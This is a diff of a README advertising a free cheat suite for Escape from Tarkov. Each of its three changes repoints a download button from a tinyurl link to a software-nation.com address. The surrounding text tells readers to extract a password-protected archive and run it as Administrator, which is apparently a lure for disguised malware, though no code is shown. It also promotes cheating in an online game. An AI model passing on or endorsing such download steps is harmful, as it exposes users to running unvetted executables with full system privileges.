@@ -9,7 +9,7 @@ The **🔫 Escape from Tarkov All Cheats** is a **free** comprehensive cheat sui
 
 <div align="center">
 
-[![Download Escape from Tarkov All Cheats](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/escape-from-tarkov-all-cheats)
+[![Download Escape from Tarkov All Cheats](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/escape-from-tarkov-all-cheats)
 
 </div>
 
@@ -121,7 +121,7 @@ Escape from Tarkov is brutally hard — one mistake and you lose everything. Thi
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Launch EFT → Use overlay menu
 
-[![Download Escape from Tarkov All Cheats](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/escape-from-tarkov-all-cheats)
+[![Download Escape from Tarkov All Cheats](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/escape-from-tarkov-all-cheats)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -266,7 +266,7 @@ Survive Tarkov and learn every map for free. **Escape from Tarkov All Cheats** g
 
 <div align="center">
 
-[![Download Escape from Tarkov All Cheats](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/escape-from-tarkov-all-cheats)
+[![Download Escape from Tarkov All Cheats](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/escape-from-tarkov-all-cheats)
 
 **Version 4.6.1** — Free EFT cheat suite. April 2026 update. Zero cost. No payment. Use at own risk.
 
